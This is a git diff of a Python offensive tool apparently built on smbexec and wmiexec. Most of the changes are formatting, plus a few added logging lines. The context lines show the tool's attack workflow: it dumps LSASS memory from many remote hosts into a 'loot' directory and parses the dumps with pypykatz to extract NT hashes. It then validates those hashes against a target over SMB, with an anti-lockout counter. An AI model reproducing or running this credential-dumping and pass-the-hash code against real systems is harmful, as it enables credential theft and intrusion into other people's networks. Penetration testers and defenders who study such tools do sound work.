@@ -52,8 +52,8 @@ SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange
 OUTPUT_FILENAME = '__' + str(time.time())
 CODEC = sys.stdout.encoding
 timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')
-acct_chk_fail = [] # this list is used to track failed login attempts
-acct_chk_valid = [] # this is used to track previously valid accounts
+acct_chk_fail = []  # this list is used to track failed login attempts
+acct_chk_valid = []  # this is used to track previously valid accounts
 
 ###################COLORS#################
 color_RED = '\033[91m'
@@ -92,6 +92,7 @@ def lognoprint(logme):
         f.write(logme + '\n')
         f.close()
 
+
 def printnlog(printlogme):
     with open('{}/log.txt'.format(cwd), 'a') as f:
         f.write(printlogme + '\n')
@@ -103,7 +104,11 @@ def printnlog(printlogme):
 
     print(printlogme)
 
+if os.path.isfile('{}/indivlog.txt'.format(cwd)):
+    os.system('sudo rm {}/indivlog.txt'.format(cwd))
+
 lognoprint('\n{}{}{}\n'.format(color_PURP, timestamp, color_reset))
+
 
 ################################################ Start of SMBEXEC ###############################################################
 
@@ -587,7 +592,6 @@ class RemoteShell(cmd.Cmd):
         self.__noOutput = False
         self.__addr = addr
 
-
         # We don't wanna deal with timeouts from now on.
         if self.__transferClient is not None:
             self.__transferClient.setTimeout(30000)
@@ -739,7 +743,7 @@ def load_smbclient_auth_file(path):
 
 ############################################################################### END OF WMIEXEC#####################################################
 
-def check_accts(username, password, domain, remoteName, remoteHost, hashes=None,aesKey=None, doKerberos=None, kdcHost=None, port=445):
+def check_accts(username, password, domain, remoteName, remoteHost, hashes=None, aesKey=None, doKerberos=None, kdcHost=None, port=445):
     upasscombo = '{}:{}'.format(username, password)
 
     nthash = ''
@@ -767,7 +771,6 @@ def check_accts(username, password, domain, remoteName, remoteHost, hashes=None,
             acct_chk_fail.append(username)
             printnlog('{} {} {}'.format(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")]))
 
-
         s = rpctransport.get_smb_connection()
         s.setTimeout(100000)
         samr.bind(scmr.MSRPC_UUID_SCMR)
@@ -781,7 +784,6 @@ def check_accts(username, password, domain, remoteName, remoteHost, hashes=None,
         if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
             acct_chk_valid.append(username)
             printnlog('{} {} {}'.format(green_plus, upasscombo.ljust(30), "Valid Creds"))
-
 
 
 def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
@@ -1107,13 +1109,14 @@ def setup_share():
 
 def alt_exec():
     yes = input('Press enter to exit ')
-    
-    try: # move the share file to the loot dir 
+
+    try:  # move the share file to the loot dir
         os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+        printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
     except BaseException as e:
         pass
 
-    if options.ap: # autoparse
+    if options.ap:  # autoparse
         printnlog("\n[parsing files]")
         os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
         os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
@@ -1122,8 +1125,7 @@ def alt_exec():
         remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
         if remove_files.lower() == 'y':
             os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
-        
-    
+
     printnlog("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
 
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
@@ -1247,6 +1249,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
 
                         try:
                             os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+                            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
                         except BaseException as e:
                             pass
 
@@ -1330,7 +1333,7 @@ def mt_execute(ip, count):  # multithreading requires a function
             executer.run(ip, ip)
         printnlog("{} {}: Completed".format(green_plus, ip))
         if count % options.threads == 0:
-            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count/len(addresses)) * 100, 2 ))))
+            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count / len(addresses)) * 100, 2))))
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
@@ -1339,11 +1342,11 @@ def mt_execute(ip, count):  # multithreading requires a function
         lognoprint('{}: {}\n'.format(ip, str(e)))
         logging.error('{}: {}'.format(ip, str(e)))
         if count % options.threads == 0:
-            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count/len(addresses)) * 100, 2 ))))
+            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count / len(addresses)) * 100, 2))))
         pass
 
-def port445_check(interface_ip):
 
+def port445_check(interface_ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.bind((interface_ip, 445))
@@ -1356,6 +1359,7 @@ def port445_check(interface_ip):
             printnlog(str(e))
 
     sock.close()
+
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -1425,6 +1429,9 @@ if __name__ == '__main__':
         exit(1)
 
     options = parser.parse_args()
+
+    if options.debug:
+        lognoprint('{}Command:{} '.format(color_PURP, color_reset) + ' '.join(sys.argv) + '\n')
 
     # Init the example's logger theme
     logger.init(options.ts)
@@ -1547,23 +1554,22 @@ if __name__ == '__main__':
 
             if os.path.isfile('{}/hist'.format(cwd)):
                 if options.sh:
-                    with open('{}/hist'.format(cwd), 'r') as f: # read this history file to an array
+                    with open('{}/hist'.format(cwd), 'r') as f:  # read this history file to an array
                         history_ips = f.readlines()
                         f.close()
                     history_ips_cleaned = []
-                    for item in history_ips: # remove \r and \n
+                    for item in history_ips:  # remove \r and \n
                         item = item.replace("\r", "")
                         history_ips_cleaned.append(item.replace("\n", ""))
-
 
                     skipped_count = 0
                     ips_to_remove = []
                     for currip in addresses:
                         if currip in history_ips_cleaned:
-                            ips_to_remove.append(currip) # need to pass it to an array first because if we just remove from the array we will skip every other one
+                            ips_to_remove.append(currip)  # need to pass it to an array first because if we just remove from the array we will skip every other one
                             skipped_count += 1
 
-                    if skipped_count > 0: # first check to see if we did get any to remove if so remove them from addresses
+                    if skipped_count > 0:  # first check to see if we did get any to remove if so remove them from addresses
                         for eachip in ips_to_remove:
                             addresses.remove(eachip)
 
@@ -1591,7 +1597,7 @@ if __name__ == '__main__':
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
             drive_letter = auto_drive(addresses, domain)
 
-        if options.oe: # I cannot for the life of me remember why this is in here
+        if options.oe:  # I cannot for the life of me remember why this is in here
             addresses = ['23423.5463.1234.3465']
 
         if options.payload == 'msbuild':
@@ -1630,7 +1636,7 @@ if __name__ == '__main__':
                 if options.localauth:
                     domain = ip
                 try:
-                    out = thread_exe.schedule(mt_execute, (ip, count, ), timeout=options.timeout)
+                    out = thread_exe.schedule(mt_execute, (ip, count,), timeout=options.timeout)
                 except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
@@ -1646,6 +1652,7 @@ if __name__ == '__main__':
 
         time.sleep(2)
         os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+        printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
 
         # for when you're attacking a lot of targets to quickly see how many we got
         printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
@@ -1653,15 +1660,14 @@ if __name__ == '__main__':
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
 
-        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(cwd, timestamp)) # gets a list of all the .dmp file names within the output dir
+        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(cwd, timestamp))  # gets a list of all the .dmp file names within the output dir
         dumped_hosts_fin = []
         for item in dumped_hosts:
-            dumped_hosts_fin.append(item[item.rfind('/')+1:item.rfind('.')]) # this substring should make the filename hostname-ip only
-        with open('{}/loot/{}/dumped_hosts.txt'.format(cwd, timestamp), 'w') as f: # writes the list to a file
+            dumped_hosts_fin.append(item[item.rfind('/') + 1:item.rfind('.')])  # this substring should make the filename hostname-ip only
+        with open('{}/loot/{}/dumped_hosts.txt'.format(cwd, timestamp), 'w') as f:  # writes the list to a file
             for host in dumped_hosts_fin:
                 f.write(host + '\n')
             f.close()
-
 
         if options.ap:
             printnlog("\n[parsing files]")
@@ -1676,14 +1682,14 @@ if __name__ == '__main__':
             if input('\nWould you like to autovalidate that any dumped NT hashes are valid? (y/N) ').lower() == 'y':
                 printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
                 try:
-                    with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f: # read the dumped_msv.txt file into msv_creds
+                    with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
                         msv_creds = f.readlines()
                         f.close()
                 except BaseException as e:
                     printnlog('\n{}[!]{} There was an error reading the dumped_msv.txt file'.format(color_RED, color_reset))
                 else:
                     msv_creds_cleaned = []
-                    for cred in msv_creds: # here we are going to remove any \r\n and any items that are missing a username
+                    for cred in msv_creds:  # here we are going to remove any \r\n and any items that are missing a username
                         cred = cred.replace('\n', '')
                         cred = cred.replace('\r', '')
                         if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
@@ -1695,13 +1701,13 @@ if __name__ == '__main__':
                         tried_full = []
                         for item in msv_creds_cleaned:
                             try:
-                                if item not in tried_full: # this prevents duplicate attempts
+                                if item not in tried_full:  # this prevents duplicate attempts
                                     idx_of_2nd_colon = item.find(":", item.find(":") + 1)
-                                    username = item[item.find(":")+1:idx_of_2nd_colon]
-                                    nthash = item[idx_of_2nd_colon+1:-1]
-                                    if acct_chk_fail.count(username) < 3: # antilockout check
-                                        if username not in acct_chk_valid: # why try again if we already found a valid set
-                                            check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':'+nthash, None, False, None, int(445))
+                                    username = item[item.find(":") + 1:idx_of_2nd_colon]
+                                    nthash = item[idx_of_2nd_colon + 1:-1]
+                                    if acct_chk_fail.count(username) < 3:  # antilockout check
+                                        if username not in acct_chk_valid:  # why try again if we already found a valid set
+                                            check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
                                             tried_full.append(item)
                                         else:
                                             printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
@@ -1753,6 +1759,7 @@ if __name__ == '__main__':
 
         try:
             os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
         except BaseException as e:
             pass
 
